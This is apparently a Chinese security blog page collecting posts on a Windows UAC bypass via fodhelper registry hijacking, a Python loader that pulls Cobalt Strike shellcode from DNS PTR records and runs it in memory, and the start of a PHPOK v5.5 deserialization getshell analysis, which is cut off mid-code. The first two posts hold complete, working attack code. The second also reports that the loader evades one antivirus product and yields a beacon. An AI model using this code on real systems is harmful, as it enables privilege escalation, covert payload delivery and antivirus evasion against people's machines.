<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-26T10:51:35.000Z" title="2021-02-26T10:51:35.000Z">2021-02-26</time>发表</span><span class="level-item"><time dateTime="2021-02-26T10:55:55.859Z" title="2021-02-26T10:55:55.859Z">2021-02-26</time>更新</span><span class="level-item">5 分钟读完 (大约712个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/">注册表劫持BypassUAC</a></h1><div class="content"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一部分系统程序可以直接获取管理员权限而不触发UAC弹窗，这类程序被称为白名单程序。如fodhelper</p>
<p>fodhelper.exe在启动过程查询注册表项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Classes\ms-settings\Shell\Open\command</span><br></pre></td></tr></table></figure>

<p>该键值对存储可执行文件路径，普通用户对HKCU有编辑权限，可以写入想要执行的任意文件，如cmd.exe，写入后的文件会以最高权限执行</p>
<p>如果上一个键值对存在，继续查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute</span><br></pre></td></tr></table></figure>

<p>若也存在，则读取第一个注册内的值执行</p>
<p>当找不到HKCU\Software\Classes\ms-settings\Shell\Open\command的时候才会去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command</p>
<p>默认情况下而HKCR\ms-settings\Classes\ms-settings\Shell\Open\command存在，而HKCU\Software\Classes\ms-settings\不存在，因此需要手动创建。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038d2e104fa2d0001e3c1a7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/238ed07e-992a-405b-aadc-e1e19b43335b.png" alt="imgbed.cn图床"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>1.RegCreateKeyA创建HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\</p>
<p>2.使用RegSetValueEx向创建的键值对里写入要执行的文件和DelegateExecute</p>
<p>3.CreateProcessA创建进程运行fodhelper.exe，以高权限运行向注册表中写入的文件</p>
<p>4.在一段时间后使用RegDeleteTreeA删除创建的键值对，恢复原状</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    HKEY hKey;</span><br><span class="line">    STARTUPINFOA StartupInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION ProcessInformation = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建注册表</span></span><br><span class="line">    RegCreateKeyA(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="comment">//写入要执行的文件</span></span><br><span class="line">    RegSetValueExA(hKey, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;cmd.exe&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;cmd.exe&quot;</span>));</span><br><span class="line">    <span class="comment">//写入DelegateExecute</span></span><br><span class="line">    RegSetValueExA(hKey, <span class="string">&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)<span class="string">&quot;&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建进程，运行fodhelper以高权限执行写入的文件</span></span><br><span class="line">    CreateProcessA(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, (LPSTR)<span class="string">&quot;/c C:\\Windows\\System32\\fodhelper.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">    </span><br><span class="line">    Sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除创建的ms-settings</span></span><br><span class="line">    RegDeleteTreeA(hKey, <span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>);<span class="comment">//删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行前</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038d2eb9efdd1000198559c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/53a992dc-d44f-405b-9849-2cfaeb72aa97.png" alt="imgbed.cn图床"></a></p>
<p>执行后</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038d2f204fa2d0001e3c1d7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed3760d0-c0d5-46ff-9c79-73f2f3b2a87e.png" alt="imgbed.cn图床"></a></p>
<h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="RegCreateKeyA"><a href="#RegCreateKeyA" class="headerlink" title="RegCreateKeyA"></a>RegCreateKeyA</h2><p>创建键值对</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCreateKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey, </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY  phkResult</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>写入注册表键值</p>
<p>成功返回 ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY       hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄 </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR     lpValueName,<span class="comment">//指定要被查询或写入的键值的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      Reserved,<span class="comment">//保留，始终为0   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      dwType,<span class="comment">//写入键值的类型   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> BYTE *lpData,<span class="comment">//写入键值的缓冲区   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cbData<span class="comment">//写入键值缓冲区的长度    </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegDeleteTreeA"><a href="#RegDeleteTreeA" class="headerlink" title="RegDeleteTreeA"></a>RegDeleteTreeA</h2><p>删除键值对</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegDeleteTreeA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h2><p>创建进程</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-26T07:53:11.000Z" title="2021-02-26T07:53:11.000Z">2021-02-26</time>发表</span><span class="level-item"><time dateTime="2021-02-26T08:15:05.102Z" title="2021-02-26T08:15:05.102Z">2021-02-26</time>更新</span><span class="level-item">7 分钟读完 (大约1015个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/">python利用dns的PTR记录加载shellcode</a></h1><div class="content"><p>DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。</p>
<p>PTR记录的两个特性</p>
<p>1.不区分大小写，dns解析结果统一转为小写</p>
<p>2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。</p>
<p>在本地服务器添加</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9145dc5370001f7945a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png" alt="imgbed.cn图床"></a></p>
<p>进行反向解析查询，192.168.111.135为DNS服务器的ip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt&#x3D;ptr 192.168.111.1 192.168.111.135</span><br></pre></td></tr></table></figure>



<p>可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a92234dcf30001560686"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png" alt="imgbed.cn图床"></a></p>
<p>用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9299efdd1000197edba"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png" alt="imgbed.cn图床"></a></p>
<p>分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a92ff6094a0001be155e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png" alt="imgbed.cn图床"></a></p>
<p>去掉所有的\x，把它们分割成多个部分按照顺序添加到PTR记录中</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a93854a29f0001250fb6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png" alt="imgbed.cn图床"></a></p>
<p>只需要按照顺序对相应的ip发起请求即可获得部分shellcode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a943002aec0001e11199"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png" alt="imgbed.cn图床"></a></p>
<p>利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> dns.reversename</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">dnsip=<span class="string">&#x27;192.168.111.135&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LoadshellCode</span>(<span class="params">shellcode</span>):</span>   <span class="comment">#执行shellcode</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestptr</span>(<span class="params">dnsip,ipnum</span>):</span>      <span class="comment">#获取PTR记录</span></span><br><span class="line">    ipaddr=<span class="string">&#x27;192.168.111.%d&#x27;</span> %ipnum    <span class="comment">#添加的PTR记录中主机ip地址的C段地址</span></span><br><span class="line">    ip=dns.reversename.from_address(ipaddr)</span><br><span class="line">    my_resolver = dns.resolver.Resolver()</span><br><span class="line">    my_resolver.nameservers = [dnsip]</span><br><span class="line">    answer = my_resolver.resolve(ip,<span class="string">&#x27;PTR&#x27;</span>)</span><br><span class="line">    recvptr=<span class="built_in">str</span>(answer[<span class="number">0</span>]).strip(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> recvptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">shellcodedemo</span>):</span>    <span class="comment">#将得到的shellcode转为十六进制</span></span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    s1=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(shellcodedemo))):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s1 += <span class="built_in">bytes</span>.fromhex(shellcodedemo[i:i + <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">60</span>):    <span class="comment">#根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)</span></span><br><span class="line">        s+=requestptr(dnsip,i)</span><br><span class="line">    LoadshellCode(str2hex(s))</span><br></pre></td></tr></table></figure>





<p>使用pyinstaller打包成exe文件，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w dnsptrshellcode.py</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png" alt="imgbed.cn图床"></a></p>
<p>pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/p1967914901/article/details/109706449">https://blog.csdn.net/p1967914901/article/details/109706449</a></p>
<p>拿到beacon</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a94a171e740001e39ed5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png" alt="imgbed.cn图床"></a></p>
<p>可以绕过360，但被火绒查杀</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a95c6cea45000126276c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png" alt="imgbed.cn图床"></a></p>
<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/sp4zcmd/DnsPTRShellcodeLoader">https://github.com/sp4zcmd/DnsPTRShellcodeLoader</a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/185324.html">https://www.freebuf.com/articles/network/185324.html</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-08T01:03:42.000Z" title="2021-02-08T01:03:42.000Z">2021-02-08</time>发表</span><span class="level-item"><time dateTime="2021-02-08T01:12:41.823Z" title="2021-02-08T01:12:41.823Z">2021-02-08</time>更新</span><span class="level-item">13 分钟读完 (大约1901个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/">PHPOK v5.5 csrf+反序列化漏洞getshell分析</a></h1><div class="content"><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>PHPOK v5.5</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p>phpokcms代码结构，关键代码都在framework文件夹下</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e13002aec00018e149e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/396424e7-befd-4ca5-86f5-01f588c84272.png" alt="imgbed.cn图床"></a></p>
<p>phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹</p>
<p>请求url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;phpok&#x2F;admin.php?c&#x3D;address&amp;f&#x3D;open</span><br></pre></td></tr></table></figure>

<p>参数c的值拼接上<code>_control.php</code>就是对应的文件，对应的类即参数c的值拼接上_control，如address_control</p>
<p>参数f的值拼接上<code>_f</code>就是对应的方法,如open_f</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e27d6547d0001d38fd5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f14ddf62-a3af-419b-ad36-b8d5d71f1703.png" alt="imgbed.cn图床"></a>](<a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e205dc5370001a461a4">https://imgbed.cn/preview?id=60208e205dc5370001a461a4</a>)</p>
<h2 id="可利用恶意类"><a href="#可利用恶意类" class="headerlink" title="可利用恶意类"></a>可利用恶意类</h2><p>文件位置：/framework/engine/cache.php </p>
<p>__destruct()调用了save方法，在save方法中使用了file_put_contents函数，函数的第一个和第二个参数均可控，但是第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;key_id,<span class="keyword">$this</span>-&gt;key_list);<span class="comment">//调用save</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;expired();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$id</span> || <span class="variable">$content</span> === <span class="string">&#x27;&#x27;</span> || !<span class="keyword">$this</span>-&gt;status)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_time();</span><br><span class="line">		<span class="variable">$content</span> = serialize(<span class="variable">$content</span>);</span><br><span class="line">		<span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;folder.<span class="variable">$id</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">		file_put_contents(<span class="variable">$file</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_time();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_count();</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;app&#x27;</span>]-&gt;db)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;key_list(<span class="variable">$id</span>,<span class="variable">$GLOBALS</span>[<span class="string">&#x27;app&#x27;</span>]-&gt;db-&gt;cache_index(<span class="variable">$id</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span 